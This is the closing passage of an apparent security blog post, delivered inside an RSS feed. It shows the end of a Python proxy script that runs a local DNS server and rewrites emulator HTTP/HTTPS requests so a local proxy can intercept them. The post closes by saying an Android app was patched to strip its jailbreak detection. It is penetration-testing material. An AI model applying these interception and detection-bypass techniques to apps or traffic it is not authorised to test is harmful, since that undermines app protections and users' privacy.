                                        # 4s  : char string of 4 bytes (ip)
                                        # 8x  : eight pad bytes
                                        srv_port, srv_ip = struct.unpack(&amp;quot;!2xH4s8x&amp;quot;, dst)

                                        if srv_port == 443:
                                                self.peer.setRequestData(data)
                                                data = &amp;quot;CONNECT &amp;quot; + inet_ntoa(srv_ip) + &amp;quot;:&amp;quot; + str(srv_port) + &amp;quot; HTTP/1.1\r\n\r\n&amp;quot;
                                                print &amp;quot;PROXIFYING HTTPS: &amp;quot; + repr(data.strip())
                                        # NOTE: If you uncomment this elif block, your proxy must support invisible proxying
                                        elif srv_port == 80:
                                                # Rewrite to absolute GET request if info available
                                                if reversemappings.has_key(inet_ntoa(srv_ip)):
                                                        data = re.sub(r&#39;^GET &#39;, &amp;quot;GET http://&amp;quot; + reversemappings[inet_ntoa(srv_ip)] + &amp;quot;:&amp;quot; + str(srv_port), data)
                                                else:
                                                        print &amp;quot;Warning: got redirected HTTP request but unable to find destination hostname:port&amp;quot;

                                except Exception, e:
                                        print &amp;quot;Something went wrong with invisible proxying:&amp;quot;, e.getMessage()
                        &amp;quot;&amp;quot;&amp;quot;

                        # ------------------- Rewrite CONNECT/GET/POST with domain name ---------------------

                        resultconnect = self.connectre.match(data)
                        resultother = self.otherre.match(data)

                        # TODO: We shouldn&#39;t use a normal replace after using regular expressions..
                        # Replace IP in CONNECT
                        if (resultconnect != None and reversemappings.has_key(resultconnect.group(1))):
                                data = data.replace(resultconnect.group(1), reversemappings[resultconnect.group(1)])
                                print &amp;quot;REWRITING CONNECT:&amp;quot;, resultconnect.group(1), &amp;quot;-&amp;gt;&amp;quot;, reversemappings[resultconnect.group(1)]
                        # Replace IP in GET, POST, HEAD, etc
                        elif (resultother != None and reversemappings.has_key(resultother.group(1))):
                                data = data.replace(resultother.group(1), reversemappings[resultother.group(1)])
                                print &amp;quot;REWRITING HTTP METHOD:&amp;quot;, resultother.group(1), &amp;quot;-&amp;gt;&amp;quot;, reversemappings[resultother.group(1)]

                        self.firstdata = data
                        self.receivedfirst = True

                        print &amp;quot;OUTGOING TCP: &amp;gt;&amp;quot;, repr(data.split(&amp;quot;\r&amp;quot;)[0][:40])


                # forward data
                portforward.ProxyServer.dataReceived(self, data)



class ProxyFactory(portforward.ProxyFactory):
        protocol = ProxyServer

        def doStart(self):
                print &amp;quot;\t==== Android Proxy Up and Running ====\n&amp;quot;


def main():
        print &amp;quot;AndroidProxy   ---   (C) Mathy Vanhoef&amp;quot;
        print &amp;quot;This program comes with ABSOLUTELY NO WARRANTY.&amp;quot;
        print
        print &amp;quot;DNS server will listen on localhost:53&amp;quot;
        print &amp;quot;HTTP Proxy will listen on localhost:8007&amp;quot;
        print
        #print &amp;quot;Physical device: Configure your computer dns server and as router (NOT as proxy) and execute&amp;quot;
        #print &amp;quot;\tiptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8007&amp;quot;
        #print &amp;quot;\tiptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8007&amp;quot;
        #print
        print &amp;quot;Emulator: start it using: emulator @AvdName -http-proxy http://localhost:8007 -dns-server localhost&amp;quot;
        print
        print &amp;quot;Don&#39;t forget to start your normal proxy on localhost:8080&amp;quot;
        print

        # Setup custom DNS server
        resolvers = []
        #resolvers.append(ProxyResolver([(&#39;8.8.8.8&#39;, 53)]))
        resolvers.append(ProxyResolver([(&#39;10.0.141.20&#39;, 53)]))
        f = server.DNSServerFactory(clients=resolvers)
        p = dns.DNSDatagramProtocol(f)
        reactor.listenUDP(53, p)

        # Setup TCP proxy server
        endpoint = TCP4ServerEndpoint(reactor, 8007)
        endpoint.listen(ProxyFactory(&#39;localhost&#39;, 8080))

        # Start DNS and TCP server
        reactor.run();


if __name__ == &amp;quot;__main__&amp;quot;:
        main()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Run this with &lt;code&gt;sudo python AndroidProxy.py&lt;/code&gt; (assuming you saved it as that), and change your Emulators launch options to &lt;code&gt;~/Library/Android/sdk/tools/emulator -avd test -http-proxy localhost:8007 -dns-server localhost -debug-proxy&lt;/code&gt;. Running it with sudo is needed as the script starts a DNS server locally. The &lt;code&gt;-debug-proxy&lt;/code&gt; option is optional, but is useful for further debugging of the traffic.&lt;/p&gt;

&lt;p&gt;As a final note on the proxy script. At some stage it looked as though names were not being resolved correctly as I was seeing output as &lt;code&gt;DNS: clients3.google.com -&amp;gt; 1.1.1.4&lt;/code&gt;. This is just the internal storage key and not the IP it resolved :D&lt;/p&gt;

&lt;h2 id=&#34;summary&#34;&gt;summary&lt;/h2&gt;

&lt;p&gt;Like I previously mentioned, with limited knowledge about smali and all that jazz, I was able to patch the application to not do the jailbreak detection it is intended to do. Removing jailbreak detection may not be such a big deal, but what else can you change, and how do you protect against that?&lt;/p&gt;</description>
    </item>
    
  </channel>
</rss>